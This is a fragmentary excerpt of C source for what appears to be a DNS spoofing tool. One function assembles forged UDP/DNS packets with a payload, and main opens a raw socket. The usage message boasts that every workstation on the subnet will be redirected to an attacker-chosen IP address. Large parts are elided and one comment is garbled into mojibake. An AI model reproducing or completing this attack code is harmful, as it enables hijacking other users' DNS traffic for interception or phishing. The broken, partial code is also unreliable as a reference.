...
int SendDns(unsigned int sourceIP,unsigned int destIP,unsigned short updPort,unsigned short checkID)
{
	...
	memcpy(sendBuff+sizeof(PSD_HEADER),&udpheader,sizeof(udphdr));
	memcpy(sendBuff+sizeof(PSD_HEADER)+sizeof(udphdr),&dnsHeader,sizeof(dnshdr));
	memcpy(sendBuff+sizeof(PSD_HEADER)+sizeof(udphdr)+sizeof(dnshdr),payload,payloadLen);
...
int main(int argc,char *argv[])
{
	...
	if(argc<3)
	{
		...
		printf("Example :%s 192.168.0.1 202.106.184.200\n",argv[0]);
		printf("\tFor this example say, my IP is 192.168.0.1 and all of the subnet workstations will be forwarding to IP 202.106.184.200:)\n",argv[0]);
	...
	sockMain=socket(AF_INET,SOCK_RAW,IPPROTO_IP);//´´½¨Ì×½Ó×Ö
